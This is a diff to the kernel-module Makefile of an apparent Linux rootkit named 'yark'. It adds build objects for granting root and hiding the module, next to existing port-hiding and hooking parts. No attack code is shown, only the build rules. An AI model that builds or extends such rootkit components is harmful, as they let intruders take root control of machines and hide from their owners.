@@ -1,6 +1,6 @@
 MODULE = yark
 obj-m += $(MODULE).o
-$(MODULE)-objs := main.o command.o hide_port.o yhook.o
+$(MODULE)-objs := main.o command.o hide_port.o yhook.o give_root.o hide_module.o
 
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
